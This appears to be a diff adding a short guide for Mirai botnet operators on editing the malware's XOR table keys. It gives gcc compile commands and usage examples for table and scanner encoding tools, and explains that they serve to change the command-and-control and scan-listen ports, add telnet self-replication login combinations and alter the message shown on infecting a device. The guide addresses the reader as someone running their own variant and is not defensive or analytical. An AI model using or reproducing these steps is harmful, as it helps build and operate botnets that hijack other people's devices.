@@ -1,0 +1,26 @@
+How to edit mirai table keys
+
+First we need to edit both the scan_enc and table_enc files. replace the existing table_key with yours.
+(get scan_enc key from your sources scanner.c file)
+(get table_enc key from your sources xor or table.c file)
+
+Now we need to install gcc to compile:
+yum install gcc -y
+
+Compile them both:
+gcc scan_enc.c -o scan
+gcc table_enc.c -o table
+
+Usage> ./table string "fuckoffiotresearcher"
+Usage> ./table uint16 "1337"
+
+Output (ex)>Xor'ing x Bytes of data
+\x01\x01\x01\x01\x01
+
+uint16 is used for ports while string is used for basically everything else, same goes for the scan tool
+Have fun!
+
+What is this tool used for?
+This tool is used for a variety of things in mirai, ranging from changing your c2 and scanlisten port to
+adding more login combos to the telnet selfrep. Or just trying to make your variant more personal like changing
+the TABLE_EXEC_SUCCESS message to say whatever you want when you infect a device
